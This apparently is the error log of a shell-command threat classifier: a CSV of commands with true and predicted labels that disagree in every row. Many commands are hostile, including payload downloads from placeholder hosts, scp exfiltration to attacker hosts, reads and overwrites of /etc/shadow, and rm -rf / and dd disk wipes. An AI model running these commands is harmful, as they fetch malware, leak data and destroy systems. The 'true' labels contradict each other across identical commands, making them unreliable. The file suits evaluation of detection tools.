command,true_label,predicted_label
cat /root/.bashrc,SUSPICIOUS,BENIGN
wget   http://evil.com/payload.sh,SUSPICIOUS,BENIGN
netstat -tulnp,SUSPICIOUS,BENIGN
echo 'hacked' > /root/.bashrc,MALICIOUS,SUSPICIOUS
sudo apt update,MALICIOUS,BENIGN
cat welcome.txt,BENIGN,SUSPICIOUS
cat readme.md,SUSPICIOUS,BENIGN
find / -name 'test',SUSPICIOUS,BENIGN
cat /etc/shadow,MALICIOUS,SUSPICIOUS
cat /root/.bashrc,MALICIOUS,BENIGN
uname   -a,MALICIOUS,BENIGN
 wget http://fileshare.com/payload.sh,SUSPICIOUS,MALICIOUS
cat ~/.ssh/known_hosts,SUSPICIOUS,BENIGN
ps aux | grep nginx ,SUSPICIOUS,BENIGN
mv /bin/bash   /tmp/bash,SUSPICIOUS,BENIGN
ls /tmp/,MALICIOUS,BENIGN
sudo apt install htop,MALICIOUS,SUSPICIOUS
scp data.tar.gz   admin@malicious.com:/var/www,SUSPICIOUS,MALICIOUS
sudo -l ,SUSPICIOUS,MALICIOUS
echo 'hacked' > /root/.bashrc,BENIGN,MALICIOUS
ifconfig,MALICIOUS,SUSPICIOUS
LS /ROOT/ ,SUSPICIOUS,BENIGN
find / -name 'test',SUSPICIOUS,BENIGN
mkdir test,BENIGN,SUSPICIOUS
SCP FILE.TXT ROOT@MALICIOUS.COM:/ROOT/,SUSPICIOUS,BENIGN
du -sh,MALICIOUS,BENIGN
env,MALICIOUS,BENIGN
cat   /root/.bashrc,BENIGN,SUSPICIOUS
sudo   su,SUSPICIOUS,BENIGN
find / -name 'test',MALICIOUS,BENIGN
ls /tmp/,SUSPICIOUS,BENIGN
wget   http://suspicious.org/payload.sh,MALICIOUS,BENIGN
cat /etc/shadow,MALICIOUS,BENIGN
sudo apt install nmap,BENIGN,MALICIOUS
ls /root/,SUSPICIOUS,BENIGN
history,MALICIOUS,BENIGN
grep root /etc/passwd,MALICIOUS,BENIGN
ps aux,SUSPICIOUS,BENIGN
sudo -l,SUSPICIOUS,BENIGN
sudo apt install net-tools,SUSPICIOUS,BENIGN
scp data.tar.gz   admin@backup.server:/root/,MALICIOUS,BENIGN
grep 'password' /etc/passwd,MALICIOUS,BENIGN
sudo   apt install nmap,MALICIOUS,BENIGN
cat readme.md,SUSPICIOUS,MALICIOUS
cat /root/.bashrc,MALICIOUS,SUSPICIOUS
dd if=/dev/zero of=/dev/sda,SUSPICIOUS,BENIGN
cat .bashrc,MALICIOUS,BENIGN
env,SUSPICIOUS,BENIGN
dd if=/dev/zero   of=/dev/sda,BENIGN,SUSPICIOUS
sudo apt install net-tools,BENIGN,SUSPICIOUS
echo 'hacked' >> /var/log/syslog,MALICIOUS,BENIGN
cat /var/log/auth.log,MALICIOUS,BENIGN
ps aux | grep nginx,MALICIOUS,BENIGN
rm -rf /* --no-preserve-root,MALICIOUS,SUSPICIOUS
wget   http://fileshare.com/update.bin,SUSPICIOUS,BENIGN
dd if=/dev/zero of=/dev/sda,SUSPICIOUS,BENIGN
 cat /home/user/todo.txt,BENIGN,MALICIOUS
rm -rf /,MALICIOUS,SUSPICIOUS
echo 'hacked' > /etc/shadow,MALICIOUS,BENIGN
curl http://unknown.site/script.sh,MALICIOUS,BENIGN
cd /root,MALICIOUS,BENIGN
 wget http://suspicious.org/payload.sh,MALICIOUS,SUSPICIOUS
 cat readme.md,SUSPICIOUS,BENIGN
scp file.txt attacker@remote:/tmp/,SUSPICIOUS,MALICIOUS
rm -rf   /home/user,MALICIOUS,SUSPICIOUS
pwd,MALICIOUS,BENIGN
echo 'hello world',SUSPICIOUS,BENIGN
scp file.txt attacker@remote:/tmp/,SUSPICIOUS,MALICIOUS
cat homework.txt,SUSPICIOUS,BENIGN
cat /var/log/auth.log,BENIGN,SUSPICIOUS
cat   /etc/passwd,BENIGN,MALICIOUS
df   -h,SUSPICIOUS,BENIGN
echo 'malware' > /tmp/malware.sh,SUSPICIOUS,MALICIOUS
mkdir   test,BENIGN,SUSPICIOUS
cat /home/user/info.txt,SUSPICIOUS,BENIGN
cat /var/log/syslog,MALICIOUS,SUSPICIOUS
cat /root/.bashrc,MALICIOUS,BENIGN
scp file.txt admin@backup.server:/var/www,MALICIOUS,SUSPICIOUS
 mkdir test,SUSPICIOUS,BENIGN
 ECHO 'HACKED' >> /ETC/SHADOW,MALICIOUS,BENIGN
ls -al,MALICIOUS,BENIGN
cd /tmp/,SUSPICIOUS,BENIGN
du   -sh,MALICIOUS,BENIGN
curl -O http://evil.com/update.bin ,SUSPICIOUS,BENIGN
pwd,SUSPICIOUS,BENIGN
chmod 777 /var/log/syslog ,MALICIOUS,BENIGN
ls   /root/,MALICIOUS,BENIGN
cat welcome.txt,SUSPICIOUS,BENIGN
touch homework.doc,BENIGN,SUSPICIOUS
curl http://unknown.site/script.sh,MALICIOUS,BENIGN
ps aux | grep mysql,MALICIOUS,BENIGN
 SUDO APT INSTALL NET-TOOLS,MALICIOUS,BENIGN
cat /home/user/info.txt,SUSPICIOUS,BENIGN
curl   http://unknown.site/script.sh,MALICIOUS,BENIGN
curl https://fileshare.com/payload.sh,SUSPICIOUS,BENIGN
scp file.txt attacker@remote:/tmp/,BENIGN,MALICIOUS
iptables -F,SUSPICIOUS,BENIGN
curl http://unknown.site/script.sh,SUSPICIOUS,BENIGN
top -n 1,MALICIOUS,BENIGN
ECHO 'HELLO   WORLD',SUSPICIOUS,BENIGN
cat /etc/passwd,SUSPICIOUS,BENIGN
touch homework.doc,MALICIOUS,BENIGN
cat /etc/shadow,MALICIOUS,BENIGN
echo 'pwned' > /var/log/syslog ,SUSPICIOUS,BENIGN
curl -O   http://malicious.com/malware.bin,MALICIOUS,BENIGN
rm -rf /,MALICIOUS,BENIGN
PING GOOGLE.COM,SUSPICIOUS,BENIGN
ping google.com,MALICIOUS,BENIGN
cat /home/user/info.txt,SUSPICIOUS,BENIGN
mv /bin/bash /tmp/bash ,MALICIOUS,BENIGN
SUDO APT INSTALL   NET-TOOLS,MALICIOUS,BENIGN
cat   welcome.txt,MALICIOUS,BENIGN
cat /etc/passwd ,MALICIOUS,BENIGN
curl http://unknown.site/script.sh,SUSPICIOUS,BENIGN
grep 'password'   /etc/passwd,BENIGN,MALICIOUS
echo 'owned' >> /root/.bashrc,MALICIOUS,BENIGN
sudo apt update,SUSPICIOUS,MALICIOUS
RM -RF /VAR/,SUSPICIOUS,BENIGN
CAT HOMEWORK.TXT,MALICIOUS,BENIGN
chmod 777 /etc/shadow,SUSPICIOUS,MALICIOUS
curl -O http://evil.com/update.bin,BENIGN,SUSPICIOUS
cat   ~/.ssh/known_hosts,SUSPICIOUS,BENIGN
curl -O http://suspicious.org/exploit.zip ,MALICIOUS,SUSPICIOUS
cat /home/user/todo.txt,BENIGN,MALICIOUS
curl -O http://fileshare.com/payload.sh,MALICIOUS,BENIGN
echo 'owned' >> /root/.bashrc,SUSPICIOUS,BENIGN
du -sh,SUSPICIOUS,BENIGN
ssh   -l 8080:target.com:80 attacker@remote,MALICIOUS,BENIGN
wget http://suspicious.org/payload.sh,SUSPICIOUS,MALICIOUS
echo 'hacked' > /root/.bashrc,BENIGN,MALICIOUS
grep root /etc/passwd,SUSPICIOUS,BENIGN
cat /etc/passwd,MALICIOUS,BENIGN
grep 'password' /etc/passwd,MALICIOUS,BENIGN
top -n 1,SUSPICIOUS,BENIGN
dd if=/dev/zero of=/dev/sda,SUSPICIOUS,BENIGN
ls /var/www,SUSPICIOUS,BENIGN
grep 'password' /etc/passwd,MALICIOUS,BENIGN
CURL -O   HTTP://MALICIOUS.COM/MALWARE.BIN,SUSPICIOUS,BENIGN
top -n 1,SUSPICIOUS,MALICIOUS
 WATCH NETSTAT -AN,MALICIOUS,BENIGN
rm -rf /home/user,SUSPICIOUS,BENIGN
rm -rf /,SUSPICIOUS,BENIGN
ls /tmp/,MALICIOUS,BENIGN
echo 'owned' >> /etc/shadow,SUSPICIOUS,BENIGN
ifconfig,SUSPICIOUS,BENIGN
sudo su,SUSPICIOUS,BENIGN
whoami,SUSPICIOUS,BENIGN
cat /var/log/auth.log,MALICIOUS,BENIGN
rm -rf   /,SUSPICIOUS,BENIGN
cat /etc/shadow,BENIGN,MALICIOUS
chmod 777 /var/log/syslog,SUSPICIOUS,BENIGN
cd   /var/www,SUSPICIOUS,MALICIOUS
cat notes.txt,SUSPICIOUS,MALICIOUS
cat .bashrc,SUSPICIOUS,BENIGN
sudo -l,MALICIOUS,BENIGN
whoami,MALICIOUS,BENIGN
cat   welcome.txt,MALICIOUS,BENIGN
cd /var/www,MALICIOUS,BENIGN
netstat -tulnp ,SUSPICIOUS,BENIGN
echo 'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
rm -rf /,MALICIOUS,BENIGN
which   python,SUSPICIOUS,BENIGN
uname -a,BENIGN,SUSPICIOUS
 chmod 777 /var/log/syslog,BENIGN,MALICIOUS
ps aux | grep   sshd,MALICIOUS,BENIGN
env,MALICIOUS,BENIGN
curl -O http://suspicious.org/payload.sh,SUSPICIOUS,MALICIOUS
chmod 777 /var/log/syslog,SUSPICIOUS,BENIGN
ls /tmp/,SUSPICIOUS,MALICIOUS
ECHO 'OWNED' >> /ETC/SHADOW,MALICIOUS,SUSPICIOUS
ps aux,SUSPICIOUS,BENIGN
mv /bin/bash /tmp/bash,MALICIOUS,BENIGN
grep 'password' /etc/passwd,MALICIOUS,BENIGN
cat /etc/passwd,MALICIOUS,BENIGN
cat /etc/shadow,MALICIOUS,BENIGN
chmod 777 /etc/shadow,SUSPICIOUS,BENIGN
find / -name 'test',MALICIOUS,BENIGN
cat   /etc/passwd,SUSPICIOUS,BENIGN
curl http://unknown.site/script.sh,BENIGN,MALICIOUS
uname -a,SUSPICIOUS,BENIGN
 chmod 777 /etc/shadow,SUSPICIOUS,BENIGN
rm -rf /* --no-preserve-root,SUSPICIOUS,BENIGN
chmod   777 /etc/shadow,SUSPICIOUS,BENIGN
watch netstat -an,SUSPICIOUS,MALICIOUS
which python,MALICIOUS,BENIGN
scp backup.sql root@malicious.com:/root/,BENIGN,SUSPICIOUS
wget http://suspicious.org/update.bin,MALICIOUS,BENIGN
chmod 777 /etc/shadow ,SUSPICIOUS,BENIGN
cd /var/www,MALICIOUS,BENIGN
cat readme.md,MALICIOUS,BENIGN
ps aux | grep sshd,BENIGN,SUSPICIOUS
rm -rf /var/,MALICIOUS,BENIGN
netstat -tulnp,SUSPICIOUS,BENIGN
ls /root/,MALICIOUS,BENIGN
SUDO SU,MALICIOUS,SUSPICIOUS
pwd,MALICIOUS,BENIGN
chmod 777 /etc/shadow,MALICIOUS,BENIGN
cat /var/log/auth.log,BENIGN,MALICIOUS
ECHO 'HACKED' >> /ETC/SHADOW,MALICIOUS,BENIGN
ping google.com,MALICIOUS,SUSPICIOUS
cat ~/.ssh/known_hosts,MALICIOUS,BENIGN
cat   /etc/shadow,SUSPICIOUS,BENIGN
cd /var/www,MALICIOUS,BENIGN
mkdir test,MALICIOUS,BENIGN
rm -rf /var/,SUSPICIOUS,BENIGN
cat /etc/passwd,MALICIOUS,BENIGN
cat welcome.txt,MALICIOUS,BENIGN
scp   file.txt attacker@remote:/tmp/,SUSPICIOUS,BENIGN
sudo apt install htop,MALICIOUS,BENIGN
ping google.com ,SUSPICIOUS,BENIGN
curl https://evil.com/exploit.zip ,SUSPICIOUS,BENIGN
top -n 1,SUSPICIOUS,BENIGN
scp data.tar.gz user@malicious.com:/root/,BENIGN,MALICIOUS
sudo apt install nmap,SUSPICIOUS,BENIGN
curl https://safe-site.org/update.sh,SUSPICIOUS,BENIGN
cat /etc/shadow,MALICIOUS,BENIGN
mv /bin/bash /tmp/bash,SUSPICIOUS,BENIGN
sudo apt install htop,SUSPICIOUS,BENIGN
iptables -F,SUSPICIOUS,MALICIOUS
wget http://evil.com/update.bin,BENIGN,SUSPICIOUS
cat /var/log/syslog,MALICIOUS,BENIGN
echo 'hacked' >> /root/.bashrc,SUSPICIOUS,BENIGN
cd   /root/,MALICIOUS,BENIGN
sudo apt install net-tools,SUSPICIOUS,BENIGN
chmod 777 /etc/shadow,SUSPICIOUS,BENIGN
ls /root/,MALICIOUS,BENIGN
sudo -l,MALICIOUS,BENIGN
NETSTAT -TULNP,BENIGN,SUSPICIOUS
curl http://unknown.site/script.sh,SUSPICIOUS,BENIGN
chmod 777 /etc/shadow,MALICIOUS,BENIGN
cd /root/,BENIGN,SUSPICIOUS
 cd /root,MALICIOUS,SUSPICIOUS
whoami,BENIGN,MALICIOUS
ifconfig,MALICIOUS,BENIGN
grep   root /etc/passwd,SUSPICIOUS,BENIGN
grep   'password' /etc/passwd,MALICIOUS,SUSPICIOUS
iptables -F,SUSPICIOUS,BENIGN
ping google.com ,SUSPICIOUS,BENIGN
pwd,SUSPICIOUS,BENIGN
curl -o http://malicious.com/malware.bin,SUSPICIOUS,BENIGN
curl -O http://fileshare.com/update.bin,SUSPICIOUS,BENIGN
whoami,SUSPICIOUS,BENIGN
CAT   ~/.SSH/KNOWN_HOSTS,SUSPICIOUS,BENIGN
echo 'hacked' > /root/.bashrc,BENIGN,MALICIOUS
ping google.com,MALICIOUS,BENIGN
cat homework.txt,MALICIOUS,SUSPICIOUS
CAT   /ROOT/.BASHRC,MALICIOUS,BENIGN
scp backup.sql admin@backup.server:/tmp/,SUSPICIOUS,BENIGN
cat   /etc/shadow,BENIGN,MALICIOUS
sudo apt install net-tools,SUSPICIOUS,BENIGN
dd   if=/dev/zero of=/dev/sda,SUSPICIOUS,BENIGN
ssh -L 8080:target.com:80 attacker@remote,MALICIOUS,BENIGN
ssh -L 8080:target.com:80 attacker@remote,SUSPICIOUS,BENIGN
chmod 777 /etc/shadow,SUSPICIOUS,BENIGN
echo 'pwned'   >> /etc/shadow,BENIGN,SUSPICIOUS
cat homework.txt,SUSPICIOUS,BENIGN
rm -rf /,SUSPICIOUS,BENIGN
chmod 777 /etc/shadow,MALICIOUS,BENIGN
grep root /etc/passwd,MALICIOUS,BENIGN
cat   /etc/passwd,SUSPICIOUS,BENIGN
top -n   1,MALICIOUS,BENIGN
uname -a,MALICIOUS,BENIGN
rm -rf /home/user,SUSPICIOUS,BENIGN
grep 'password' /etc/passwd,SUSPICIOUS,BENIGN
scp backup.sql   root@backup.server:/var/www,SUSPICIOUS,BENIGN
 CURL HTTPS://EVIL.COM/PAYLOAD.SH,SUSPICIOUS,BENIGN
rm -rf /home/user ,SUSPICIOUS,BENIGN
cat   .bashrc,MALICIOUS,BENIGN
curl https://fileshare.com/payload.sh,MALICIOUS,BENIGN
ifconfig,SUSPICIOUS,BENIGN
curl -O http://evil.com/exploit.zip,SUSPICIOUS,BENIGN
ps aux | grep mysql,MALICIOUS,BENIGN
echo 'pwned' >> /var/log/syslog,SUSPICIOUS,BENIGN
curl https://safe-site.org/update.sh,MALICIOUS,BENIGN
rm -rf /var/,BENIGN,SUSPICIOUS
cat   /root/.bashrc,MALICIOUS,BENIGN
dd   if=/dev/zero of=/dev/sda,SUSPICIOUS,MALICIOUS
sudo apt   install net-tools,SUSPICIOUS,MALICIOUS
sudo apt install net-tools,MALICIOUS,BENIGN
cat /root/.bashrc,BENIGN,SUSPICIOUS
ls /tmp/,MALICIOUS,BENIGN
cat /etc/shadow,SUSPICIOUS,BENIGN
 grep root /etc/passwd,SUSPICIOUS,MALICIOUS
ps aux | grep mysql,SUSPICIOUS,BENIGN
echo 'owned' >> /var/log/syslog,SUSPICIOUS,BENIGN
chmod 777 /var/log/syslog,SUSPICIOUS,BENIGN
pwd,SUSPICIOUS,BENIGN
PWD,SUSPICIOUS,BENIGN
curl https://safe-site.org/update.sh,SUSPICIOUS,BENIGN
chmod 777 /root/.bashrc,MALICIOUS,BENIGN
curl https://evil.com/update.bin,SUSPICIOUS,BENIGN
rm -rf /home/user,SUSPICIOUS,BENIGN
scp file.txt admin@malicious.com:/var/www,BENIGN,SUSPICIOUS
 curl http://unknown.site/script.sh,MALICIOUS,BENIGN
echo 'hello',BENIGN,SUSPICIOUS
env,SUSPICIOUS,BENIGN
wget http://malicious.com/payload.sh,SUSPICIOUS,BENIGN
cat /etc/shadow,SUSPICIOUS,MALICIOUS
sudo   -l,SUSPICIOUS,BENIGN
pwd,SUSPICIOUS,BENIGN
ssh -L 8080:target.com:80 attacker@remote,BENIGN,MALICIOUS
ps aux,SUSPICIOUS,BENIGN
cat   welcome.txt,BENIGN,MALICIOUS
sudo -l ,MALICIOUS,SUSPICIOUS
curl https://suspicious.org/update.bin,SUSPICIOUS,BENIGN
sudo su,SUSPICIOUS,BENIGN
sudo apt install net-tools ,MALICIOUS,BENIGN
cat readme.md,MALICIOUS,BENIGN
ls   /root/,SUSPICIOUS,BENIGN
df   -h,MALICIOUS,SUSPICIOUS
CAT /VAR/LOG/SYSLOG,MALICIOUS,BENIGN
ps aux | grep sshd,MALICIOUS,BENIGN
chmod 777 /etc/shadow,SUSPICIOUS,BENIGN
curl -O http://fileshare.com/update.bin,MALICIOUS,SUSPICIOUS
sudo su,SUSPICIOUS,BENIGN
curl http://unknown.site/script.sh,SUSPICIOUS,MALICIOUS
sudo -l,MALICIOUS,BENIGN
ls -al,MALICIOUS,BENIGN
df -h,SUSPICIOUS,BENIGN
history,BENIGN,MALICIOUS
find / -name 'test',SUSPICIOUS,BENIGN
find /   -name 'test',SUSPICIOUS,BENIGN
env,MALICIOUS,SUSPICIOUS
wget http://malicious.com/payload.sh ,SUSPICIOUS,BENIGN
wget http://fileshare.com/update.bin ,SUSPICIOUS,BENIGN
which python,MALICIOUS,BENIGN
sudo su,MALICIOUS,BENIGN
LS -AL,SUSPICIOUS,BENIGN
ps aux,MALICIOUS,BENIGN
ps aux | grep sshd,SUSPICIOUS,BENIGN
sudo apt update,SUSPICIOUS,BENIGN
cd /tmp/,SUSPICIOUS,BENIGN
cd /root,MALICIOUS,BENIGN
curl http://unknown.site/script.sh,SUSPICIOUS,BENIGN
curl -O http://malicious.com/malware.bin,MALICIOUS,BENIGN
cat   .bashrc,SUSPICIOUS,BENIGN
which python,SUSPICIOUS,BENIGN
curl -O http://malicious.com/malware.bin,MALICIOUS,BENIGN
sudo apt install net-tools,MALICIOUS,BENIGN
top -n 1,SUSPICIOUS,BENIGN
ping   google.com,MALICIOUS,SUSPICIOUS
uname -a,SUSPICIOUS,BENIGN
CD   /ROOT,SUSPICIOUS,BENIGN
cat   /etc/shadow,SUSPICIOUS,BENIGN
CURL -O   HTTP://SUSPICIOUS.ORG/EXPLOIT.ZIP,MALICIOUS,BENIGN
CURL   HTTPS://SUSPICIOUS.ORG/PAYLOAD.SH,MALICIOUS,BENIGN
grep root /etc/passwd,MALICIOUS,BENIGN
echo 'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
curl https://suspicious.org/payload.sh,SUSPICIOUS,MALICIOUS
top -n 1,MALICIOUS,SUSPICIOUS
env ,BENIGN,SUSPICIOUS
cd /root/,MALICIOUS,BENIGN
echo 'hacked' >> /var/log/syslog,SUSPICIOUS,BENIGN
SUDO APT INSTALL NMAP,BENIGN,SUSPICIOUS
sudo apt install net-tools,MALICIOUS,SUSPICIOUS
netstat -tulnp,MALICIOUS,SUSPICIOUS
cat homework.txt,MALICIOUS,BENIGN
CAT NOTES.TXT,MALICIOUS,BENIGN
curl https://suspicious.org/exploit.zip,MALICIOUS,BENIGN
cd /tmp/,MALICIOUS,BENIGN
sudo -l ,SUSPICIOUS,BENIGN
rm -rf   /,MALICIOUS,BENIGN
mv /bin/bash /tmp/bash ,MALICIOUS,SUSPICIOUS
cat /etc/shadow,MALICIOUS,BENIGN
netstat -tulnp,SUSPICIOUS,MALICIOUS
cd /var/www,MALICIOUS,BENIGN
ps aux,MALICIOUS,BENIGN
history,MALICIOUS,BENIGN
ls   /tmp/,MALICIOUS,BENIGN
sudo -l,MALICIOUS,BENIGN
 whoami,SUSPICIOUS,BENIGN
SUDO   SU,SUSPICIOUS,BENIGN
du -sh,MALICIOUS,BENIGN
grep 'password' /etc/passwd,MALICIOUS,BENIGN
cat notes.txt,SUSPICIOUS,BENIGN
CURL HTTPS://SAFE-SITE.ORG/UPDATE.SH,MALICIOUS,BENIGN
curl http://unknown.site/script.sh,MALICIOUS,BENIGN
NETSTAT -TULNP,BENIGN,SUSPICIOUS
sudo apt install net-tools,MALICIOUS,BENIGN
PWD,MALICIOUS,BENIGN
grep root   /etc/passwd,MALICIOUS,BENIGN
curl https://safe-site.org/update.sh,MALICIOUS,BENIGN
